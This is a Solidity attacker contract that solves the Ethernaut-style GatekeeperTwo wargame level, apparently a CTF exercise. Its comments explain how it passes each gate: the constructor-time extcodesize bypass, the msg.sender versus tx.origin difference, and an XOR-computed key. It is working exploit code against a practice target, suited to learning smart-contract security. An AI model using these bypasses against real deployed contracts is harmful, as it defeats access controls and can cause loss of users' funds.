// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GateKeeperTwoAttacker {
    constructor(address _victimAddr) {
        // since it is called through the constructor msg.sender will be Attacker-Contract and tx.origin will be USER, And it will pass-through gate1
        // Since this Contract has no code other than the constructor, this will pass through gate2
        // To pass through gate-3 use x ^ (x ^ y) == y
        // Here y => type(uint64).max & x => uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))), so
        uint64 x = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 xXORy = x ^ type(uint64).max;

        (bool success, bytes memory data) = _victimAddr.call(
            abi.encodeWithSignature("enter(bytes8)", bytes8(xXORy))
        );

        require(success == true);
        bool passed = abi.decode(data, (bool));
        require(passed == true); // verify all gates are passed
    }
}

// - Write a deploy script for this Attacker NEXT  @todo
